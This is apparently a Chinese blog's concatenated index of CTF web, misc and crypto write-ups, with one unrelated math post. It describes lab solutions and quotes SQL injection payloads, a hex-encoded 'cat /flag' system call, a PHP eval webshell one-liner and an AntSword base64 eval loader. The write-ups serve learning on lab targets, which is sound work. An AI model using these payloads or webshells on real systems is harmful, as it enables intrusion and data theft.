发现提示是phpinfo.php 所以直接选择看/phpmyadmin/ 发现是phpmyadmin 4.8.1的版本 然后就上万能的CSDN… 发现有本地包含漏洞 直接拿漏洞打就完事了： payload： [BJDCTF2020] Mark loves cat 变量覆盖题。 进入靶机，就是一个贼酷炫的前端页面（ 然后啥也点不了 这个时候就要考虑是不是有dirsearch可以扫出来的东西了 使用dirsearch 能够扫描出/.git/ 使用githack下载源码： 所以思路很清晰，只需要将上面那三个变量选一个覆盖成$flag，然后再满足你所选择变量的exit条件即可 (虽然但是我到现在都不知道handsome要怎么做，怎么让flag=一个变量，这个变量又不能等于flag啊) 方法一： 如果选择yds： 首先将yds覆盖成flag： 然后… 如果GET传入flag和POST传入的flag都是空的话，就exit了 所以直接结束 方法二： 如果选择is： 还是先将is覆盖成flag： 看条件，如果get或者post传入flag的值为flag时，exit 所以后面传入flag=flag即可 [安洵杯 2019] easy_web 打开一看，也是啥都没有。。。 不过首页那个img=比较奇怪，看起来像base64加密 把他拖入CyberChef，发现其经过了1次Hex加密和2次base64加密 最初的结果是555.png 大抵就是那张图片？ 利用这个原理，我们将555.png改为index.php，然后进行同样的加密，尝试获取源码： 这里最大的问题就是如何使得一个字符串a的值不等于b，md5的值又要强相等（如果是两个等号，可以使用0e开头的md5） 使用 fastcoll 快速MD5碰撞生成器： 可以构建两个md5值一样，但是内容完全不一样的字符串 使用方法如下： 创建一个文本文件，写入内容，命名 cmd运行： fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt（其中init是你创建的文本文件，1.txt和2.txt是生成的两个文本的txt文件） 然后需要进行一步url编码才能够正常使用： result： 由于字符串比较长，所以使用burp进行Post传参：对于过滤，使用反斜杠绕过，空格使用%20进行url编码（burp里面打那个空格直接bad request了）： 找到flag 直接cat /flag "},{"title":"Dandelin双球模型","date":"2022-12-19T09:37:02.000Z","url":"/posts/62938.html","tags":[["不务正业","/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/"]],"categories":[["不务正业系列","/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/"]],"content":"最近有个小朋友问我Dandelin用来证明一个平面截圆锥得到的截口曲线是椭圆的模型的题咋做的，我一看，我大意了，不会做… 所以直接去网上百度一下，水了一篇博客出来 0x01 Dandelin模型 你是否在寻找Dandelion() Germinal Dandelin，著名数学家，主要成就有Dandelin双球模型，在圆锥与圆的切线等研究上取得了巨大的成果。其Dandelin的双球模型便是在一个圆锥内塞入两个球，这两个球既与圆锥相内切，又与一个公共平面相切，这个公共平面截圆锥所得到的截口曲线便是圆锥曲线（可以是椭圆、双曲线和抛物线） 0x02 Dandelin双球模型的证明 根据圆锥曲线的第一定义即可证明： 如果平面内一动点与两定点F1、F2的距离之和等于一个常数的轨迹为椭圆 那么我们就有如下的证明过程，假设上面的小圆圆心为O1、大圆圆心为O2，内切球与圆锥的交点为B、C： 所以截口曲线便是椭圆 0x03 截口曲线离心率的计算 离心率计算公式： 那么我们根据几何关系计算出c和a即可 为方便计算取其截面图如上，并且添加辅助线后的图如下（辅助线是手动添加的，可能十分不平整）： 假设D、E是切点，连接O1F1、O2F2、O1D、O2E 又作O1G垂直于O2E，垂足为G（O1、F1、G三点并不共线） 同时设轴线C1C2与平面α的交点为H 夹角为β、与母线的夹角为γ 由上面的推导可得到： 容易证明得到： 就能够将DE转到O1G 接下来提供两种方法（其实二者是一致，实际上只有一种的）： （假设圆的半径，O1O2的距离已知） 法一： 其实细细看来可以进行如下的推导： 这也就是方法二，计算这两个夹角的余弦值即可 其实这两个方法确实是一样的（雾 当然，如果选取的夹角不一样，得到的结论也会略有不同，但是离心率的值仍然是两个角度的比值： 参考了闲敲棋子落灯hua师傅的文章 0x04 小拓展 由该双球模型得出的离心率的取值是由截面与底面的夹角α决定的（一般认为圆锥固定不变） 所以截取的角度不同，所得到的圆锥曲线也不同（根据离心率判断即可） 在某些动点类求轨迹的问题中，也可以通过截面与底面的夹角α，母线与底面的夹角β来确定离心率，从而确定轨迹是何种圆锥曲线 更多的题型可以去参考棋子落灯hua师傅的文章，由于本人能力有限，这里就不作展开 其实真的是因为我又菜又懒，然后啥也不会... 参考文章： 【解题研究】对于圆锥截口曲线性状的Dandelin双球证明 "},{"title":"Buuoj题目(2)","date":"2022-12-15T06:43:46.000Z","url":"/posts/9830.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"做做buuoj上的web题，本萌新纯采集，轻喷（（（ [GXYCTF 2019] 禁止套娃 打开靶机，页面直接显示 “flag在哪里呢？” 所以我们使用dirsearch扫描试试，看看是否有敏感文件 不得不说buu的反爬是真的恶心…扫快一点就会弹429 发现/.git/能正常访问 使用githack下载源码，源码如下： 一眼顶针，鉴定为无参数RCE（经典括号嵌套） 这个过滤的挺少，直接祭出payload薄纱： （雾） 好了不闹了，先用： 看flag的位置： 发现在倒数第二，使用array_reverse逆转到第二位，刚好能够使用next函数读取数组的第二位 使用show_source读取php文件即可 [BSidesCF 2020] Had a bad day 打开靶机，发现很多猫图和狗子的图片（雾，重点不是这个） 看看上面的url，发现category= 这引诱人上去加单引号啊（（（ 试试加个单引号 发现报错了，但是报错的不是sql（ 发现了include报错，尝试能不能打开index.php获取源码： 成功读取base64，进行一个解码： 以下是解码的内容： 重点就是传参的内容需要含有woofers或者meowers或者index，才能进行文件的包含，那这个就很简单了，直接加一个woofers/meowers/index到base64-encode后面去即可，payload如下： 获得base64，解码获得flag： [NCTF 2019] Fake XML cookbook 又是我不会的新知识呢 XXE（XML External Entity Injection） 打开靶机，又是登录。。。 尝试弱口令和SQL注入，肯定是不行的 然后使用Burp抓包，发现了一段： 加载了来自外部的实体，导致了可以加载外部文件，可以进行文件的读取 以及加上题目的提示 XML，应该可以执行XXE 一个经典的XXE组成如下（DTD外部实体声明） 所以直接通过burp抓包，然后使用XXE攻击即可 成功获得flag "},{"title":"Buuoj题目(1)","date":"2022-12-09T02:44:14.000Z","url":"/posts/54886.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"做做buuoj上的web题，本萌新纯采集，轻喷（（（ [网鼎杯 2018] Fakebook SQL注入兼反序列化 点开靶机，一眼醒目的login和join，尝试login，那肯定是失败的 所以我们试试注册，填好个人信息之后点击提交，但是提示Blog is not valid. 所以应该是博客地址的问题，应该是要一个确切的博客地址 所以这里把博客的地址都填上（只用填github.io的就可以了） 然后观察url发现no=1 于是尝试no=1’ 发现SQL报错了 于是进行SQL注入 回显 no hack _，说明过滤了关键词 接下来就是测试关键词的时候 发现union 无no hack回显 union select 有no hack 回显 应该是过滤了空格 所以使用 发现报错，去掉单引号 发现2号位回显正常 然后上方有个notice: unserialize() 说明有反序列化的存在 爆出库名 fakebook 爆出表名 users 爆出列名 no username passwd data 发现了一串序列化的结果 然后似乎就做不下去了。。。 应该还有一些隐藏的文件吧，打开F12也没有提示 所以应该是存在敏感文件 打开dirsearch扫一下… 不过由于buuoj有反爬这个特性在，所以很难受的就是需要加上delay，使得扫描的过程十分的慢… 推荐盲试 robots.txt www.zip .bak啥的 在robots.txt发现： 直接访问/user.php.bak获得源码 所以我们只需要序列化用file协议写出的flag位置，读入后使用curl就能够返回flag的内容了 flag应该在根目录，那么序列化如下： 所以使用sql的语句写入内容： 如果没有内容，打开F12试试，如果也没有的话就换位置 测试3、4号位： 发现4号位回显正常，打开F12即可获取flag [BJDCTF2020] The mystery of ip smarty 模板注入 打开靶机 点击Flag，发现显示的是你的IP 点击Hint，发现提示： 修改ip的话，应该是X-Forward-For的问题，所以我们使用burp抓包进行测试 修改X-Forward-For为127.0.0.1，显示为127.0.0.1 试试修改为{7*7}，发现显示为49 应该就是ssti模板注入了，然后祭出经典老图 其实也可以通过 查看哪个模板 所以是smarty的ssti注入 smarty的模板注入直接使用系统命令即可： 获得flag [BJDCTF2020]ZJCTF，不过如此 [ZJCTF2019]NiZhuanSiWei的复刻了属于是（雾） 直接看代码： 同样的写入，文件包含以及一个next.php 那我们直接data协议写入，php://filter文件包含即可 获得next.php内的base64代码，进行一个decode 经典再现： 指路Day 4: Baby match（每日一题） preg_replace /e能够执行strolower(“\\\\1”)的内容 preg_replace输入的第一个是正则表达式re，然后将re，然后将re，然后将str的值替换进strtolower(“\\\\1”) 也就相当于是 也就是说我们需要传入一个正则表达式，以及一个需要执行的命令，这个正则表达式能够匹配所有的字符 正则表达式：.*又称为贪婪模式，可以匹配到所有的字符 但是url中不能够使用 . 会被php读取成下划线 所以我们可以使用另外一个正则表达式：\\S* 这个正则表达式可以匹配任何非空字符，等价于： 然后我们传入的命令需要调用getFlag函数，执行eval函数： 所以写成${getFlag()}，而eval函数直接执行get传参cmd传入的命令 所以cmd=system(‘cat /flag’); 但是由于这段代码是在next.php内的，所以我们需要进入next.php并且执行命令 未完待续捏 参考资料： 我的飞书云文档 The mystery of ip "},{"title":"AuroraCTF Write Up","date":"2022-12-03T13:10:01.000Z","url":"/posts/1516.html","tags":[["SQL_Injection","/tags/SQL-Injection/"],["RCE","/tags/RCE/"]],"categories":[["CTF WriteUp","/categories/CTF-WriteUp/"]],"content":"本萌新第二次参加的比赛，毕竟是新生赛，各位师傅都很手下留情了qwq。 我主要做web方向，也做一点简单的Misc和Crypto方向的题，反正就是不看提示和百度基本上做不出来的那种qwq What is CTF((( 简单说找flag交上去能拿到分，分越高越好（ 好像说了跟没说一样 其形式有解题赛、攻防赛、混合赛等 大致流程为参赛队伍通过攻防对抗，程序分析等形式获得提供环境的一串flag 将其交给主办方… 嗯，大致又分成五个方向：Web、Reverse、Pwn、Misc、Crypto(logy) 其实可能还有BlockChain( 嗯，大概就这样 Web: 呃呃呃，就是处理用户到网站之间的各种安全事件（ 写后门，内网渗透日穿内网巴拉巴拉（（ Crypto：密码学~ Reverse：逆向工程，破解程序获得源代码，从而写外挂（并不） Pwn：漏洞挖掘提权（来源于俚语：攻破设备或系统 反正本采集完全不会pwn… Misc：顾名思义，即为杂项，包含图片或者音频隐写、wireshark的流量分析、一些密码的破译等等等等，甚至能够在Misc里玩到音游，学会Misc，你就能成为全栈爷（雾） 雾 Web soeasyssti 无过滤的ssti jinjia2模板注入，payload： 获得flag Aurora{wu_wu_Just_@_Fl@sk_Test!} 刻猫猫 F12打开获得传参点 所以 wifestring(33) “Aurora{GensheN_1s_v3ry_fantastiC}” 原神3.2 这里其实是我先用dirsearch扫了一遍发现的www.zip 然后下载下来解压会发现source.js 是一串jsfuck代码，需要使用提供的网站解码（我也不知道为什么，反正我自己找的是解不出来 打开F12，发现secret.php 点进去发现title处就是flag的前半段 组合一下就是 是不是因为没有抽到专武…？ easyrce CTFShow红包题第二弹复刻（雾） get传参，只能使用p和.+`等 嗯，那就差不多了 构造PostPoc 网页处传参 回显fl3g.txt 直接cat即可 AURORA{0h_n1c3!} easyinclude putenv函数将环境从bin更改，调用函数的时候需要添加绝对路径 如 ls --&gt; /bin/ls die码如下： revengessti ssti模板注入，过滤了单引号、下划线 使用ctfshow366的payload： 这里是使用cookie传参 flag=Aurora{Request_reQuest_@ll_requesT!!} 关于ssti，本萌新其实真的不懂qwq letmeguess 每日一题的靶场做过一次了，所以比较简单 提示是登录的密码是弱密码，所以可以直接用字典爆（ 爆出来的结果就是admin123 然后就可以使用ping了，ping后面可以夹带其他命令，比如ls、cat啥的 这里如果直接使用|ls的话会显示非法语句，说明存在过滤 应该是preg_match型（同样使用%0a绕过 发现 这个kylin应该就藏有flag 输入cat login.php/index.php发现被过滤 这里的过滤应该是cat / 空格 /两者都有 所以干脆直接全换了：空格换成%09、cat换成nl/echo/tac payload: Tha1nodeshell 额，这个是不可见字符成的后门，可以通过visual studio code 看见 可以通过这个字符传递参数，执行命令 打开F12 提示/read 和flag在环境变量内 这里的post file其实是使用post方法传递一个file 不是上传文件… 由于是nodejs，所以可以访问app.js 其实这里也能看得到的，逗号后面空了一个 这里漏掉的字符可以进入checkcommands 执行命令 所以可以使用这个字符执行命令，并且写入一个文件中，再读取即可 大概如此，然后读取1.txt即可 another_vn_node 啊这个是取巧做的（ 使用CVE-2022-21824进行攻击（ submit之后直接查看/flag Aurora{78929acd-3456-4483-b043-c9c5fa1a5a59} babysql 喜提-52分，看了提示才知道是无列名注入 omo 提示 使用mysql.innodb_table_stats时，不储存列名，这也是为什么叫无列名注入 使用提示爆出库名、表名 很明显flag表内的内容就是我们需要的内容，接下来我们要读取它的列 无列名注入的大概意思就是 给表里面的列取个名，然后读取它 根据提示的命令得知过滤了空格，回显位置为3 自己测试发现过滤了#、–+ 所以这里使用了单引号闭合 不要问我怎么测出来的，一个劲的搞时间盲注，我是铸币 hard_rce hhh，写过的demo里面提到过确实很难，搞不懂，现在再看应该还是这样的 学习一下即可，die码如下 可以看出过滤了很多函数、同时这个preg_replace处限制了我们只能够使用无参数rce（函数嵌套括号） 这就让我想起了之前做的一个题的payload： 然后一看，var_dump、array、pos、localeconv全被过滤了，寄 但是万幸没有过滤show_source和scandir 可以通过scandir(‘.’)返回的内容使用show_source()显示出来，然后flag应该是在最末尾（这里比较幸运的就是撞对了），可以使用end()读取，所以关键就是构造出那个点（pos(localeconv())就是返回这个点） 而仔细看没有过滤chr 而点又是chr(46)，所以这里只需要构造出46就好了 接下来就是借鉴dalao写的wp里面的内容了 使用burp的intruder模块进行爆破就好了 flag: Aurora{you_are_so_great} [middle]Jacko说很简单的rce 这道题考察的rce并不是常规的eval、passthru等，而是挺少见的一个函数：proc_open proc_open的用法： 示例1： 示例2(来自php官方文档)： 注意到如果我们有向pipes[0]写入的情况时，前面proc_open需要打开php，pipes[0]写入我们的内容 回到这题： 是不是很类似上面的示例2？ 我们需要向pipes[0]写入c2 c1就是我们前面的php 所以这题的payload就是： 吗？ 是，但是对了一半。 因为我们看到前面对c1和c2做出了限制： 这里的意思就是preg_match()匹配空格、$、&#123; 所以我们的payload不能有这些 绕过空格即可： 此处使用\\x20： 利用短标签+反引号命令执行 当然，更加常用的或许是： [middle-hard]easyyyphar 简单的phar反序列化，刚开始可能找不到哪里可以上传文件，但其实只要访问upload.php即可找到： phar不在意其后缀，如果使用png后缀的话直接:phar://folder/filename.png即可 接下来解决另一件事，怎么写表单： 这里提供一个html页面上传表单： 将phar上传即可，文件放在了/upload/filename 接下来考虑pop链： 这里test我们是不用管的，能够让我们进行rce的在micgo类内 要触发toString，那就得先将对象当作字符串使用 而echo正好有这个功能 所以可以通过qka的invoke或者hhh的desctruct触发，如果要触发qka的invoke，需要将对象当作函数使用，此时hhh的wakeup正有此功能 我的pop链是这样的： 注意，我们是可以在类里面写construct函数的： exp.php: 上传时记得将后缀改为png 然后返回index.php: Misc xnheulpb 百度一下题面xnheulpb 发现其名为小鹤双拼 根据打字的方法打出这几个字即可 绝密信息 提示是有标记，所以拖进stegsolve查看 Check in 找出这段文字不和谐的地方即可 题外话:想起自己怎么做这个题的时候就笑死了 day 1: 欸为什么这么长一段英文啊，然后仔细看看，On!y是什么鬼 然后想起星期五的英文 我明白了，然后去对照哪里有不同（其实拖进word就知道了 然后我就很傻的一直用原来的英文输入flag day 2：躺床上继续想，欸，是不是提交改了之后的英文？ 立刻爬起来 一看 所有错误的英文单词能够组成welcome! 那没事了 PING 打开Wireshark查看ping的内容即可 会发现每次ping的最后总会返回一个字符 而露出破绽的地方就在{，是flag的格式（ 所以打开查看每一个ping的数据就能找到flag了 图片太多了qwq，懒得保存了 组合一下就是 Aurora{Wh4t_1s_PING?} Location 推荐使用 exif在线查看一把梭 EXIF信息查看器 然后配合 经纬度格式转换工具软件使用 StrongMan Hint: Faster; Higher; Stronger. Come and see him in all his glory. Higher处加粗、附件是三张图片，应该是提示修改图片高度 使用010Editor修改即可 修改宽高后即可看到flag： （第一张图是Aurora{W） WebShell 既然是webshell，那么hacker肯定需要通过eval函数post一些东西执行命令 然后会回显结果 所以我们直接查查执行的命令以及回显的结果 也就是 http contains c 发现回显的内容是一串base64，解码即可 Barcode 条形码解密，附件是缺失定位码的QRCode、Maxicode、dotcode、pdf417 直接修补定位码、然后全部丢进去Dynamsoft Barcode Reader 这个也是能直接读取pdf的（ 结束~ WebShell 2 同样是webshell，所以搜索http contains c 发现hacker是通过上传webshell进行攻击的，同时发现了一个zip文件，使用wireshark可以进行导出 保存为1.zip，打开发现需要密码 所以我们还需要在流量内找压缩包的密码 由于hacker是上传的webshell到服务器内，所以我们需要关注他post的内容是啥 这是很明显的蚁剑流量特征（详见看看蚁剑流量包） 解码出来同样也是蚁剑享有的@ini_set头 所以hacker应该是上传了一个webshell到服务器，然后使用蚁剑连接执行的操作 所以我们对其传参的值需要从第三位开始进行base64 decode（也就是删除前两个字符进行解码） 所以我们一个个找POST请求，并且对传参的值进行解码即可 最后在分组202处找到压缩包的密码：CrazyKFCvivo50 然后解压缩即可 Aurora{Antsword_1s_n0thing_mor3_7han_that} Crypto latex喵 latex的每个符号都是由 \\一串英文 构成的 找出构成的符号的英文，取其首字母即可 所以 flag{catflaG} boxlin’s calculator 嗯，真就直接nc 然后算50个简单的加法就好了（雾 记得准备好计算器 easy_hash DoubleFermat 费马分解（ 其实可以偷偷去用yafu或者factordb分解大数 可以将n分解成p、q、r、s 那么phi= (p-1)(q-1)(r-1)(s-1) 然后就是跑脚本 嗯，连带看提示+百度搜索会做的就这么多了，果然我还是太菜了Orz 题目质量很好，明年再来~"},{"title":"Dest0g3 520 迎新赛部分write up","date":"2022-11-13T06:42:49.000Z","url":"/posts/32534.html","tags":[["SQL_Injection","/tags/SQL-Injection/"],["RCE","/tags/RCE/"],["POST","/tags/POST/"],["Upload","/tags/Upload/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"你管这叫迎新赛… 猛新啊，那没事了。 只有自己不会做的世界达成了 Misc的话… 之后再看看 phpdest require_once绕过 require_once()：引用或者包含外部的一个php文件，但是如果已经包含过一次了，该文件不会再次被包含 源码如下： 可以看见flag.php已经被包含了一次了，所以我们要进行require_once的绕过 参考这篇文章的payload： php源码分析 require_once 绕过不能重复包含文件的限制 | CN-SEC 中文网 进行base64解码后就能获得flag 成功获得flag EasyPHP 提示：Post something 认识set_error_handler() 源码如下： 上面那个if的条件肯定是实现不了的，哪里有大于24小时或者31天或者60秒的时候啊 所以关键就是在set_error_handler()上了 这个函数是，当报错时，就会执行 也就是我们要POST传参让其报错（ 又因为$fl4g 和 $dest0g3之间有个. 代表拼接 （例如fl4g=a dest0g3=b 之后的结果就是ab） 但是php中，数组和字符串是不能拼接的，会报错 所以我们传入数组 就会报错，执行set_error_hanlder 打印fl4g SimpleRCE 学到了新姿势… Try Try hex2bin 源码如下： 我的妈，那叫一个地狱绘图 ban掉了: ^ 、.、`、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\\ 然后ban掉了常用的eval执行的命令 但是，唯独少了个单引号 参考了dalao的wp，发现一个神奇的函数：hex2bin() hex2bin()：转换十六进制字符为二进制ASCII字符串 用法：hex2bin(‘hexcode’) 例：echo hex2bin('68656c6c6f20776f726c64'); //输出Hello World 所以没有过滤单引号给我们使用了hex2bin的机会 只需要构造出system(‘cat /flag’)就结束了 system --&gt; 73797374656d cat /flag --&gt; 636174202f666c6167 也就是构造 aaa=hex2bin('73797374656d')(hex2bin('636174202f666c6167')); 成功获取flag funny_upload .htaccess的新姿势 文件上传的新姿势 打开F12可以看到如下脚本： 对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的= = 看看wp，要用php包含的方式连蚁剑，我也不知道为什么，挺神奇的 我们的.htaccess参数有： .htaccess中使用auto_prepend_file与auto_append_file能在所有页面的顶部和底部require文件 php_value auto_prepend_file 在页面顶部加载文件 php_value auto_append_file 在页面底部加载文件 所以我们传入的.htaccess文件内容如下： 然后传个1.txt 蚁剑连接，找到flag Really Easy SQL 延时盲注（过滤sleep()，substr()） 输入啥都没反应，由于又是SQL注入，很容易想到延时盲注 提示是insert注入 所以payload的格式有：0' or payload or' 采用NewStarCTF的延时盲注脚本就可以了 但是这里直接使用会发现啥也没有，那肯定是过滤了字段 找了找writeup： 发现给了黑名单 过滤sleep和substr 所以我们的payload修改下，mid能够替换substr，benchmark能替换sleep benchmark：让数据库反复多次做一件事，增大延迟（比如执行2500000次的MD5加密） 这个benchmark的误差真的太大了，注意使用时按照延迟修改下keep>的参数 尤其是跑table和column的时候，那个误差，会输出全是~ 同样使用二分脚本即可，payload编写方式与NewStarCTF 的延时盲注一致 同样的，睡一觉起来就能拿到flag了 先去睡会吧~ 不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag EasySQL 和上一题是一样的，但是过滤了大小于号… 那么我们就不能够用二分跑了，只能一个个遍历，我靠 用二分能够稍微提速，遍历那就是坐牢中的坐牢了（我手机点完外卖了都没跑完一个） 同样写脚本，只需要注意什么时候中断循环就行了 同样使用3000000次和1.8的keep，跑出来的结果是最精确的 当然也可以试试(32,127)，正向跑，不知道正向跑和反向跑哪个快点呢= = 这是真的慢啊啊啊啊啊 跑了大概17、8分钟后，终于跑完了 会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄 参考资料： .htaccess文件解析漏洞 Dest0g3 520迎新赛 web部分 wp PHP字符串函数hex2bin require_once 绕过 还是开摆吧，呜呜 Orz"},{"title":"看看蚁剑流量包","date":"2022-11-10T15:37:24.000Z","url":"/posts/39070.html","tags":[["POST","/tags/POST/"],["Misc","/tags/Misc/"]],"categories":[["CTF Misc","/categories/CTF-Misc/"]],"content":"今天来看看Misc（雾） 只是简单的看一下蚁剑上传的包被wireshark抓包以后的形式 工具准备 Wireshark / Burp Suite （抓包工具，如果使用Burp需要在蚁剑设置代理） 中国蚁剑（AntSword） 以及测试靶机（使用校内靶机进行测试） 开始测试 1.使用txt文档写一个简单的一句话木马 &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; 然后修改成1.php 2.随后上传至靶机，使用蚁剑连接。连接成功后打开虚拟终端 3.使用Wireshark监听数据，虚拟终端内输入whoami，将会获得如下图POST包 也可以输入其他命令（比如我输入的是cd /var/www/html/） 3.1 如果你使用的是Burp Suite，打开监听，设置蚁剑的代理为127.0.0.1:8080 然后重复3.的步骤 可以将其复制出来，会发现仅有简单的urlencode，使用解码工具就能够得到以下代码： 又长又臭的一段代码 分析源码 开头：朴实无华的post（连接的密码） 存在有以下的特征： 以@ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0);开头，由于蚁剑是明文传输，所以很容易被发现 后面有base64字符 以及数据包内存在base64加密的分段内容，经过解码后可以看到路径 命令 以及随机数（后面会看见） 使用eval执行 注：旧版蚁剑还有的特征在user-agent处，请求头是antsword xxx，但是在新版的蚁剑中此特征已被移除。UA头已经改为默认ua头了（下图为旧版蚁剑的UA头） 可以看见function占大部分，而且发送指令时，代码和指令是一块发送的（例如发送了其他post的指令） 就像下面的post指令 使用wireshark可以看到传参的值 将传参的值使用base64解码（注意，从第三位开始才能正常解码），解码结果如下 基本上只有简单的加密 Base64加密 在编码器中选择base64加密 wireshark抓包后的结果如下 可以看到明显的base64 eval函数 Value: @eval(@base64_decode($_POST['c540d73cacbdc8'])); 经过base64解密，可以看到如下图所示的结果 可以看得出来，和明文是一样的 chr()加密 结果大同小异 同样解码后还是经典的@ini_set(&quot;display_errors&quot;, &quot;0&quot;); RSA加密 在蚁剑的编码器管理中生成RSA密钥 传上去的流量包是这样的，毫无规律 大概就是这样了 写的很水，也不会做Orz 参考资料： 菜刀、蚁剑、冰蝎、哥斯拉特征码 蚁剑流量分析 大佬轻喷qwq"},{"title":"Buuoj Hack World 题解","date":"2022-11-09T05:08:46.000Z","url":"/posts/60450.html","tags":[["SQL_Injection","/tags/SQL-Injection/"],["POST","/tags/POST/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"续接上文 打开靶机 同样是sql注入，题面已经提示我们flag在flag表的flag列里了 接下来我们只需要查询就好了 检测注入方式 输入1’ 回显bool(false) 没有报错信息 使用堆叠注入和联合查询 均回显SQL Injection Checked. 那只能考虑盲注，测试下是否有两种回显方式 使用1^1 和1^0 测试 发现1^1时，回显Error 发现1^0时，回显Hello, glzjin wants a girlfriend. 说明可以使用盲注 直接跑脚本就行了 把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id） Payload 但是这里跑是跑不出结果的 问题分析 测试语句 1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104) (因为flag的第一个字母f的ascii是102) 发现SQL Injection Checked 所以说某些词被检测到了 经测试… 当输入select(group_concat(flag))时，检测到了SQL注入 修改Payload 如果列内只有一个数据，可以不使用group_concat 因为flag列只有一个flag（ 所以脚本payload改为 1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid) 成功拿到flag PS：不要直接copy我的flag，这个题是动态flag"},{"title":"NewStarCTF SQL注入题","date":"2022-11-08T07:24:09.000Z","url":"/posts/40736.html","tags":[["SQL_Injection","/tags/SQL-Injection/"],["POST","/tags/POST/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"摆烂大师的第一篇Web文章，qwq。检验我摆烂的水平的时间到了 写写NewStarCTF的SQL注入题吧… 五周考了五个注入，考的点都不一样 NewStarCTF Week 1： Word - For - You 嗯… 这个题其实并不算sql注入，只是让你熟悉SQL的语句罢了 打开靶机 查询语句发现，输入1和输入1’的回显是一致的，根据这个信息能够初步得出考的应该不是SQL注入 SQL万能密码 一般查询数据库执行的语句时 select user_id,user_type,email from users where user_id='用户名' and password='密码' 由于后台进行数据库查询时没有滤过单引号，当输入admin 和 1’ or’1’='1时，执行的语句为： select user_id,user_type,email from users where user_id='admin' and password='1' or'1'='1' 这样子看的话，SQL查询语句被分成了两段： 第一段：select user_id,user_type,email from users where user_id='admin' and password='1' （由于sql语句中逻辑优先度 【=】&gt;【and】&gt;【or】） 第二段：'1'='1' 这两段语句之间的逻辑运算符是or 由于1=1恒为真，所以这段SQL语句恒为真，认证成功 payload 使用SQL注入万能密码查询 1' or'1'='1 拿到flag NewStarCTF Week 2： Word - For - You (2 Gen) 报错注入 / sqlmap一把梭 打开靶机 输入1’ 发现报错，存在SQL注入 测试联合注入 测试字段 输入1' order by 3# 报错 而输入1' order by 2# 回显正常，说明字段数为2 测试回显位 输入1' union select 1,2# 只显示查询成功，说明没有回显位 无法使用联合注入查询 使用报错注入 报错注入适用条件：页面没有回显位，但是页面会有报错信息，例如输入 1' order by 3#的时候 注入语句：updatexml(1,'~',3)，当第二个语句包含特殊字符时，数据库会报错，并且会把参数的内容显示在报错中 需要使用concat语句拼接字符串，长串的语句使用group_concat 查询命令： 1' and updatexml(1,concat('~',database()),3)# --爆库 爆出库名wfy 1' and updatexml(1,concat('~',(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)# --爆表 1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),3)# --爆列名 爆出的列名为id,text,user,name,display 我们只需要查询text的内容即可 payload 1' and updatexml(1,concat('~',(select(reverse(group_concat(text))) from wfy_comments)),3)# 要点： 报错注入的查询内容的字符是有限制的，如果内容过多，则无法回显。所以我们这里使用reverse()将flag倒着输出 使用select之前都需要在select前加括号 拿到倒置的flag sqlmap一把梭 sqlmap的使用教程可以查看这篇博客文章 &lt;[(9条消息) 工具使用]SqlMap_拈花倾城的博客-CSDN博客_sqlmap联动msf/&gt; 我们可以使用burp抓包的方式，抓到包的数据存入txt文本内，并使用sqlmap梭哈 将抓包的数据保存至txt文本内 sqlmap -r 1.txt --dbs sqlmap -r 1.txt -D wfy --dump 爆库内容 NewStarCTF Week 3： multiSQL 堆叠注入，sql预处理语句 题目描述：需要我们修改火华老师的成绩，让他通过四级考试 测试联合注入 / 报错注入 输入1' 1均无回显 输入1' union select 1,2,3,4# 发现被过滤 联合注入失败 由于无报错信息，无法使用报错注入 堆叠注入 堆叠注入是将多个sql语句一起执行，使用;间隔的注入方式 输入1';show databases;# 爆库 输入1';show tables;# 爆表 输入1';show columns from score;# 爆列名 修改数据 使用update语句修改分数即可 发现被过滤，怀疑过滤update 所以这里需要我们使用sql预处理语句进行拼接，绕过update的过滤 设置sql语句=拼接u 和后面的语句 预处理sql_exe 执行sql_exe 点击验证成绩即可，然后就能拿到flag 或者 查看分数 点击验证成绩就能获得flag 彩蛋 这里如果修改的分数不一样的话，拿到flag的对话也是不一样的 修改成100分的结果如下 修改成99999分的结果如下 所以这个故事告诉我们不要把分数改的太大（雾） NewStarCTF Week 4： 又一个SQL 异或/布尔盲注 打开靶机 尝试性输入1 和 1’ 果然，寄。没有回显位，没有报错信息。 我们常用的三种注入方式已经无效了，所以我们接下来要考虑盲注 由于输入1 和 1’的回显信息是好耶和啊哦（刚好是两种不同的信息） 我们这里输入0试试 发现输入0和输入1是两种不同的回显，这样我们就可以使用盲注了 异或运算 异或的运算有： 1 ^ 1 = 0 1 ^ 0 = 1 0 ^ 0 = 0 0 ^ 1 = 1 也就是说，两件事的异或运算中，如果有一真一假，就会输出1 如果两件都是真，则输出0 那么我们就可以通过异或运算构造sql语句查询 1^(length(database())=3) 注：如果过滤空格，则需要通过加括号的方式进行绕过，此题过滤了空格，所以要在length前加括号 如果数据库的名称长度为3，则为真 1^1 = 0，传的数据为0，回显为啊哦 如果数据库的名称长度不为3，则传的数据为1，回显为好耶 通过不断更改=后面的数字，可以得出数据库的长度 发现=3时，返回啊哦，则说明数据库长度为3，并且布尔/异或盲注可用~ 接下来就是编写脚本的事情了 编写盲注脚本 采用二分法方式编写盲注脚本 啥是二分法方式？ 